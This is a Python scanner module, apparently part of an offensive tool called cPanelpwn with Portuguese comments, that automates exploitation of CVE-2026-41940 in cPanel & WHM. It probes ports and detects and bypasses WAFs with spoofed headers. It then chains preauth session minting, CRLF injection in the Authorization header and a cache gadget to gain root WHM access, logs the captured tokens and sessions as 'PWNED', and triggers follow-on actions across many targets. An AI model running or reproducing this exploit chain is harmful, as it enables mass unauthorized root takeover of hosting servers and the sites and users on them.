"""Módulo cPanelpwn: scanner."""

import re, json, time
from typing import Optional
from datetime import datetime
from . import config as cfg
from . import cves
from .config import C, log
from .core import (ScanCtx, _has_explicit_port, build_url, is_version_patched, parse_target)
from .discovery import WHM_PORTS, probe_whm
from .exploit import (stage0_canonical, stage1_preauth, stage2_inject,
                      stage3_propagate, stage4_verify)
from .http import _do
from .store import CTX_MAP, CTX_MAP_LOCK, Progress, STORE
from .waf import (detect_waf, get_bypass_delay, get_bypass_headers,
                  waf_bypass_agent)
from .actions import run_action

# ══════════════════════════════════════════════════════════════
#  VERIFICAÇÃO PASSIVA DE VERSÃO (modo --check)
# ══════════════════════════════════════════════════════════════
def check_target(target: str) -> dict:
    """Verificação passiva de versão — sem exploit, sem minting de sessão."""
    if "://" not in target:
        target = "https://" + target
    # Auto-enumerar porta se não foi especificada
    if not _has_explicit_port(target):
        _, _host, _ = parse_target(target)
        found = probe_whm(_host, timeout=cfg._TIMEOUT_PROBE)
        if found:
            target = found
    scheme, host, port = parse_target(target)
    result = {"target": target, "check_only": True}

    # Tentar /json-api/version não autenticado
    url  = build_url(scheme, host, port, "/json-api/version?api.version=1")
    resp = _do(url, timeout=cfg._TIMEOUT_PROBE)
    if resp.status == 200 and '"version"' in (resp.body or ""):
        m = re.search(r'"version"\s*:\s*"([^"]+)"', resp.body)
        version = m.group(1) if m else "unknown"
        patched = is_version_patched(version)
        result["version"] = version
        result["patched"] = patched
        result["cves"] = [c.id for c in cves.cves_affecting(version)]
        if patched is False:
            log("HIGH", f"VULNERABLE v{version} — unpatched", target)
        elif patched is True:
            log("INFO",  f"Patchado   v{version}", target)
        else:
            log("WARN",  f"Rama desconhecida v{version}", target)
        return result

    # Fallback: extrair versão da página de login
    url2  = build_url(scheme, host, port, "/login")
    resp2 = _do(url2, timeout=cfg._TIMEOUT_PROBE, follow=False)
    body2 = resp2.body or ""
    m2    = re.search(r'(?:cPanel|WHM)[^"\']*?(\d+\.\d+\.\d+\.\d+)',
                      body2, re.IGNORECASE)
    if m2:
        version = m2.group(1)
        if not version.startswith("11."):
            version = "11." + version
        patched = is_version_patched(version)
        result["version"] = version
        result["patched"] = patched
        result["cves"] = [c.id for c in cves.cves_affecting(version)]
        log("INFO", f"Versão a partir da página de login: v{version}", target)
    else:
        result["error"] = f"HTTP {resp2.status} — versão não exposta"
        log("WARN", f"Não foi possível determinar a versão (HTTP {resp2.status})", target)

    return result

# ══════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════
#  SCANNER PRINCIPAL
# ══════════════════════════════════════════════════════════════
def _finish(progress, checkpoint, target: str, result: dict, vuln: bool):
    """Tick de progresso + persistência de checkpoint para alvo terminado."""
    if progress:
        progress.tick(vuln)
    if checkpoint:
        try:
            checkpoint.mark_done(target, {
                "vuln":    vuln,
                "finding": result.get("finding") if vuln else None,
                "ts":      datetime.now().isoformat(),
            })
        except Exception:
            pass

def scan(target: str, args, progress: Optional[Progress] = None) -> dict:
    if "://" not in target:
        target = "https://" + target
    target = target.rstrip("/")

    # Auto-enumerar porta quando nenhuna foi especificada
    if not _has_explicit_port(target):
        _, _host, _ = parse_target(target)
        log("INFO", f"Porta não informada — enumerando {WHM_PORTS}...", _host)
        found = probe_whm(_host, timeout=cfg._TIMEOUT_PROBE)
        if found:
            target = found
            log("OK", f"WHM encontrado em {C.GREEN}{found}{C.RESET}", _host)
        else:
            target = f"https://{_host}:2087"
            log("WARN", "Nenhuma porta WHM respondeu — tentando 2087", _host)

    result = {"target": target, "vuln": False}

    log("SCAN", "Iniciando cadeia de exploit...", target)
    scheme, host, port = parse_target(target)
    timeout = args.timeout

    # Detecção WAF/CDN (probe rápido, não bloqueante)
    waf = detect_waf(scheme, host, port, cfg._TIMEOUT_PROBE)
    if waf:
        result["waf"] = waf
        waf_hdrs  = get_bypass_headers(waf)
        waf_dl    = get_bypass_delay(waf)
        log("WARN",
            f"WAF/CDN detectado: {C.YELLOW}{waf}{C.RESET} — perfil de bypass ativo",
            target)
        log("INFO",
            f"  Bypass: {len(waf_hdrs)} header(s) de spoofing  "
            f"inter-stage delay={waf_dl}s  "
            f"headers={list(waf_hdrs.keys())}")
    else:
        waf_hdrs = {}
        waf_dl   = 0.0

    # Reuso de sessão — omitir estágios 0-3 se --session + --token fornecidos
    provided_session = getattr(args, "session", None)
    provided_token   = getattr(args, "token_reuse", None)

    if provided_session and provided_token:
        log("INFO", "Usando session/token fornecidos — omitindo estágios 0-3")
        session_base = provided_session
        token        = provided_token
        canonical    = args.hostname or host
    else:
        canonical = args.hostname or stage0_canonical(
            scheme, host, port, timeout, waf_hdrs=waf_hdrs)
        if not canonical:
            canonical = host
        log("INFO", f"Canónico: {canonical}")

        if waf_dl: time.sleep(waf_dl)
        log("STEP", "Estágio 1/4 — Minting de sessão preauth...")
        session_base = stage1_preauth(
            scheme, host, port, canonical, timeout, waf_hdrs=waf_hdrs)
        if not session_base:
            log("ERR", "Estágio 1 falhou — abortando", target)
            _finish(progress, cfg._CHECKPOINT, target, result, False)
            return result

        if waf_dl: time.sleep(waf_dl)
        log("STEP", "Estágio 2/4 — Injeção CRLF via header Authorization...")
        token = stage2_inject(
            scheme, host, port, canonical, session_base, timeout, waf_hdrs=waf_hdrs)

        # WAF blocked stage2 → engage bypass agent
        if not token and waf:
            token = waf_bypass_agent(waf, scheme, host, port,
                                     canonical, session_base, timeout)

        if not token:
            log("ERR", "Estágio 2 falhou — alvo pode estar patchado ou WAF imbypassable",
                target)
            _finish(progress, cfg._CHECKPOINT, target, result, False)
            return result

        if waf_dl: time.sleep(waf_dl)
        log("STEP", "Estágio 3/4 — Disparando gadget do_token_denied (raw→cache)...")
        stage3_propagate(
            scheme, host, port, canonical, session_base, timeout, waf_hdrs=waf_hdrs)

    if waf_dl: time.sleep(waf_dl)
    log("STEP", "Estágio 4/4 — Verificando acesso root WHM...")
    verify = stage4_verify(scheme, host, port, canonical,
                           session_base, token, timeout, waf_hdrs=waf_hdrs)

    if not verify.get("confirmed"):
        log("ERR", "Estágio 4 falhou — o bypass de auth não confirmou", target)
        _finish(progress, cfg._CHECKPOINT, target, result, False)
        return result

    version = verify.get("version", "unknown")
    patched = is_version_patched(version)
    pnote   = ""
    if patched is True:
        pnote = f" {C.YELLOW}(v{version} — pode estar patchado, verificar manualmente){C.RESET}"
    elif patched is False:
        pnote = f" {C.RED}(v{version} — VULNERABLE CONFIRMADO){C.RESET}"

    log("PWNED", f"CVE-2026-41940 CONFIRMADO — acesso root WHM! {pnote}", target)
    log("PWNED", f"  Token    : {token}")
    log("PWNED", f"  Sessão  : {session_base[:40]}...")
    log("PWNED", f"  Versão  : {version}")
    log("PWNED", f"  API URL  : {build_url(scheme, host, port, token+'/json-api/version')}")

    finding = {
        "severity":  "CRIT",
        "title":     "CVE-2026-41940 — Bypass de Autenticação cPanel & WHM",
        "target":    target,
        "canonical": canonical,
        "session":   session_base,
        "token":     token,
        "version":   version,
        "api_url":   build_url(scheme, host, port, f"{token}/json-api/version"),
        "evidence":  verify.get("body", "")[:400],
        "cve":       "CVE-2026-41940",
        "cvss":      f"{cves.cvss_of('CVE-2026-41940', 9.8):.1f}",
        "waf":       result.get("waf", ""),
        "timestamp": datetime.now().isoformat(),
    }
    STORE.add(finding)
    if cfg._JSON_LINES:
        print(json.dumps(finding, ensure_ascii=False), flush=True)

    ctx = ScanCtx(scheme, host, port, canonical, session_base, token, timeout,
                  waf=waf or "", bypass_hdrs=waf_hdrs)
    with CTX_MAP_LOCK:
        CTX_MAP[target] = ctx

    result["vuln"]    = True
    result["finding"] = finding
    result["ctx"]     = ctx

    _finish(progress, cfg._CHECKPOINT, target, result, True)
    if not progress:
        if args.action:
            run_action(ctx, args)

    return result

# ══════════════════════════════════════════════════════════════

